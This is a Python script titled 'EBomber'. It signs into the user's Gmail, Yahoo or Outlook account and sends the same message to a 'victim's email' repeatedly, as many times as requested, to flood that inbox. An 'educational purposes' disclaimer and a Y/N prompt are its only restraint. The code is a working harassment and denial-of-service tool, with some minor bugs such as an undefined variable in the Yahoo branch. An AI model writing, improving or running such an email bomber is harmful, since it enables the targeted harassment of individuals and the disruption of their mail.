#!/usr/bin/python3
#Made by sheikhjamal.


#Modules
import email
import smtplib
import platform
import datetime
import os
import getpass
import sys
import poplib
os.system('clear')

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
#HEADER

print(bcolors.OKGREEN + '''
______ ____                  _
| ____| __ )  ___  _ __ ___ | |__   ___ _ __
|  _| |  _ \ / _ \| '_ ` _ \| '_ \ / _ | '__|
| |___| |_) | (_) | | | | | | |_) |  __| |
|_____|____/ \___/|_| |_| |_|_.__/ \___|_|                  Made by sheikhjamal....
 
[!] Only use this tool for educational purposes. [!]   

Only supports Gmail, Yahoo & Hotmail/Outlook.

Make sure your email has less secure apps on...

''' + bcolors.ENDC)

eduask   = raw_input("Only for Education Purposes? Y/N: ")
if eduask == 'Y':
	servermail = raw_input('Server mail options:\n [1] Gmail, [2] Yahoo [3] Hotmail/Outlook:  ')
	if servermail == '1' or servermail == 'Gmail' or servermail =='gmail':
		server = smtplib.SMTP('smtp.gmail.com',587)	
		server.starttls()

		gmail     = raw_input("Enter Your Gmail : ")
		password  = getpass.getpass("Enter your Password:")

		if not  gmail  and not password:
				print("You must Login to your Gmail")
		else:
				server.login(gmail,password)
				print("Successfully Signed in")
				
				send = raw_input("Please enter your victim's email: ")

				print("Enter number of times you want to flood")
				countnum= int(raw_input("Count: "))
				

				msg = raw_input("Enter your message:\n")
				
				

				for count in range(int(countnum)):
					server.sendmail(gmail,send,msg)
					print(count,"Messages sent! ")



				server.quit()
				
				
	elif servermail == '2' or servermail == 'Yahoo' or servermail == 'yahoo':
		server = smtplib.SMTP('smtp.mail.yahoo.com',587)	
		server.starttls()

		yahoomail     = raw_input("Enter Your Yahoo Mail: ")
		passwd  = getpass.getpass("Enter your Password:")

		if not  yahoomail  and not passwd:
				print("You must Login to your Yahoo mail!")
		else:
				server.login(yahoomail,passwd)
				print("Successfully Signed in")
				
				victimem = raw_input("Please enter your victim's email: ")

				print("Enter number of times you want to flood")
				countnum2= int(raw_input("Count: "))
				

				msge = raw_input("Enter your message:\n")
				
				

				for count in range(int(countnum2)):
					server.sendmail(yahoomail,victimem,msge)
					print(count2,"Messages sent! ")



				server.quit()
				
				
	elif servermail == '3' or servermail == 'Outlook' or servermail == 'Hotmail' or servermail == 'Hotmail/Outlook' or servermail =='hotmail/outlook':
		server = smtplib.SMTP("smtp-mail.outlook.com", 587)
		server.starttls()
		
		hotmail = raw_input('Enter your Hotmail/Outlook: ')
		password = raw_input('Enter your password: ')
		if not hotmail and not password:
			print('You must login to your Hotmail/Outlook!')
		else:
			server.login(hotmail,password)
			print("Successfully Signed in")
				
			victimaa = raw_input("Please enter your victim's email: ")

			print("Enter number of times you want to flood")
			countnum32= int(raw_input("Count: "))
				

			msg2 = raw_input("Enter your message:\n")
				
				

			for count in range(int(countnum32)):
				server.sendmail(hotmail,victimaa,msg2)
				print(countnum32,"Messages sent! ")
	

else:
		print(bcolors.WARNING + "ONLY USE THIS TOOL FOR EDUCATIONAL PURPOSES!")
		print(bcolors.WARNING + "THIS TOOL WAS CREATED AND SHOULD BE FOR EDUCATION PURPOSES!")
		print(bcolors.WARNING + "I AM NOT RESPONSIBLE FOR ANYTHING YOU DO FOR THIS PROGRAM")
				

